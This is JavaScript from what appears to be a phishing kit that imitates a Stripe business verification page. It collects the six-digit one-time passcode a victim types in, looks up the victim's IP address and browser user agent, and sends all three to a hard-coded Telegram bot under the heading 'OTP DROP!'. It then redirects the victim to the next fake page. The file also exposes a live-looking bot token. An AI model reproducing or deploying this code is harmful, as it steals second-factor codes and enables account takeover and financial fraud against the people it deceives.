
let tg = {
    token: "6196464257:AAFGMOt5B7IrruEyHeKIjV4hGV_Q2km10Ss", // Your bot's token that got from @BotFather
    chat_id: "5708903193" // The user's(that you want to send a message) telegram chat id
}
const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request

$.getJSON("https://api.ipify.org?format=json", function(data) {
         
// Setting text of element P with id gfg


let ipx = document.getElementById('useripotp').value = data.ip

console.log(ipx)
})

// document.getElementById('userdevice').value = agent;

$( ".submu" ).click( function(event) {
    event.preventDefault();
    document.getElementById("shin").click();
})


const otppform = document.getElementById('shin');
// $(document).ready(function(){
otppform.addEventListener("click", function (event) { 
    event.preventDefault();

    let otp1 = document.getElementById("otp7") 
    let otp2 = document.getElementById("otp2")
    let otp3 =   document.getElementById("otp3")
    let otp4 = document.getElementById("otp4") 
    let otp5 = document.getElementById("otp5") 
    let otp6 =   document.getElementById("otp6") 
    // let otp7 =    document.getElementById("otp1").value


      if(otp1.value == "" || otp1.value == null){
      otp1.focus()
      }
      else if(otp2.value == "" || otp2.value == null){
       otp2.focus()
      }
      else if(otp3.value == "" || otp3.value == null){
       otp3.focus()
      }
      else if(otp4.value == "" || otp4.value == null){
        otp4.focus()
      }
      else if(otp5.value == "" || otp5.value == null){
        otp5.focus()
      }
      else if(otp6.value == "" || otp6.value == null){
        otp6.focus()
      }
  
  else{

    $(".con-btn").removeClass("continue-blue")
    $(".con-btn").addClass("loading-blue")
    $(".con-btn-class").addClass("hidden-view")
    $(".loading-ani").removeClass("hidden-view")
    $(".loading-ani").addClass("shown-view")
     const data = document.getElementById("otp7").value +  document.getElementById("otp2").value + document.getElementById("otp3").value 
     + document.getElementById("otp4").value + document.getElementById("otp5").value + document.getElementById("otp6").value + document.getElementById("otp1").value

     console.log( data );
    // const data = $(otppform).serialize()

    const userip = document.getElementById('useripotp').value

    // let dd = $( this ).serialize()

    // let dopo = dd.replace(/&/g, " & ")

    // let dat = dopo.replace(/%40/g, "@")

    // let data = dat.replace(/=/g, " : ")

    const agent = JSON.stringify(navigator.userAgent)



// console.log(userip + email + password)




    const obj = {
        chat_id: tg.chat_id, // Telegram chat id
        text:   "OTP DROP!"+ "\r\n\n" + " IP : " + userip + "\n\n" + "# Another beautiful tool by https://github.com/tutgirl #"+ "\n\n" + 'User Otp : '  + data  + "\n\n" + "\n\n"  +" [Device Type] : " + agent + "\n\n"
          // The text to send
      
    };


 
     // Get U-Agent 

    const xht = new XMLHttpRequest();
    xht.open("POST", url, true);
    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
    xht.send(JSON.stringify(obj) );









window.location.replace('/BusinessStripe')
















      
    

  }

















    // const expr = otp1 && otp2 && otp3 && otp4 && otp5 && otp6 && otp7
    // switch (expr) {
    //   case expr == "null":
    //     case expr == "":
    //     console.log('Oranges are $0.59 a pound.');
    //     break;
    //   // case 'Mangoes':
    //   // case 'Papayas':
    //   //   console.log('Mangoes and papayas are $2.79 a pound.');
    //   //   // Expected output: "Mangoes and papayas are $2.79 a pound."
    //   //   break;
    //   default:
      
      


    // }
    


  });


  document.getElementById("otp7").addEventListener('input', function(){
    document.getElementById("otp2").focus()
  })

  document.getElementById("otp2").addEventListener('input', function(){
    document.getElementById("otp3").focus()
  })


  document.getElementById("otp3").addEventListener('input', function(){
    document.getElementById("otp4").focus()
  })

  document.getElementById("otp4").addEventListener('input', function(){
    document.getElementById("otp5").focus()
  })

  document.getElementById("otp5").addEventListener('input', function(){
    document.getElementById("otp6").focus()
  })


  document.getElementById("otp6").addEventListener('input', function(){
    
    document.getElementById("shin").click();
    
  })


//   const data = document.getElementById("otp7").value +  document.getElementById("otp2").value + document.getElementById("otp3").value 
//   + document.getElementById("otp4").value + document.getElementById("otp5").value + document.getElementById("otp6").value + document.getElementById("otp1").value

// });